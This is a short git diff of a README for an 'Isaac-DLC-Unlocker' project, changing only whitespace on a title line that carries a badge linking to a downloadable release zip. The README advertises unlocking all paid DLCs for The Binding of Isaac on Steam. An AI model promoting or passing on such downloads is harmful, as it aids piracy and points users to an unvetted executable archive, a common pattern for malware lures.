@@ -1,4 +1,4 @@
-# Isaac-DLC-Unlocker [![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue)](https://github.com/Gillielillian498/Isaac-DLC-Unlocker/releases/download/v2.0/TheBindingOfIsaac_DLC_Unlocker.zip) 
+# Isaac-DLC-Unlocker [![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue)](https://github.com/Gillielillian498/Isaac-DLC-Unlocker/releases/download/v2.0/TheBindingOfIsaac_DLC_Unlocker.zip)  
 
 **Unlock and Install All DLCs for The Binding of Isaac: Rebirth on Steam**
 ![Screenshot](https://github.com/user-attachments/assets/fee95f0c-ae14-4466-81f6-0e1d02ce4093)
